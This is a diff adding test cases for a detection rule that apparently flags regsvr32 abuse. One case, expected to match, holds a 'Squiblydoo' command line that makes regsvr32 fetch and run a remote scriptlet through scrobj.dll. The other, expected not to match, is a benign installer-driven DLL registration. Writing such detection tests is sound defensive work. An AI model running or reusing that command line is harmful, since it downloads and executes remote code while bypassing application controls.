@@ -1,0 +1,18 @@
+rule_id: a8865a25-ebd0-49d0-accc-928a5fd12abf
+cases:
+  - name: Squiblydoo fetching a remote scriptlet
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      OriginalFileName: 'REGSVR32.EXE'
+      CommandLine: 'regsvr32.exe /s /n /u /i:http://198.51.100.23/file.sct scrobj.dll'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'OPENSOC\jdoe'
+  - name: Legitimate DLL registration during installation
+    expect: no_match
+    event:
+      Image: 'C:\Windows\SysWOW64\regsvr32.exe'
+      OriginalFileName: 'REGSVR32.EXE'
+      CommandLine: 'regsvr32.exe /s "C:\Program Files (x86)\Vendor\Plugin\vplugin.dll"'
+      ParentImage: 'C:\Windows\System32\msiexec.exe'
+      User: 'NT AUTHORITY\SYSTEM'
